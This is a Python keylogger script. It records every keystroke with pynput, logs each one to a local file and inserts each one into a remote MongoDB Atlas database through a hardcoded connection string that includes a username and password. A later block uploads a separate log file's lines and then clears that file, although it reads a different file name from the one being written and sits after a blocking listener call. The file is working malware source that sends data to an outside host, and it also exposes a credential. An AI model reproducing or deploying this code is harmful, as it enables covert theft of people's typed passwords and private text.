import pymongo
import os
import time
import requests
from pynput.keyboard import Key, Listener
import logging

log_dir = ""  # Path to the directory where you want to store the log file
mongodb_uri = "mongodb+srv://psaurav020:psaurav020@keylogger.eakp4ae.mongodb.net/?retryWrites=true&w=majority&appName=keylogger"  # MongoDB URI

# Connect to MongoDB
client = pymongo.MongoClient(mongodb_uri)
db = client["keylogger"]
collection = db["keystrokes"]

# Set up logging
logging.basicConfig(filename=(log_dir + "key_log_online.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

    # Insert the keystroke into MongoDB
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    data = {"timestamp": timestamp, "keystroke": str(key)}
    collection.insert_one(data)

with Listener(on_press=on_press) as listener:
    listener.join()

# Check for internet connection
def check_internet():
    try:
        requests.get("http://www.google.com", timeout=3)
        return True
    except requests.ConnectionError:
        return False

# Upload data to MongoDB when internet connection is available
if check_internet():
    with open(log_dir + "key_log.txt", "r") as file:
        for line in file:
            timestamp, keystroke = line.strip().split(": ")
            data = {"timestamp": timestamp, "keystroke": keystroke}
            collection.insert_one(data)

    # Clear the log file after successful upload
    open(log_dir + "key_log.txt", "w").close()

# Close the MongoDB connection
client.close()
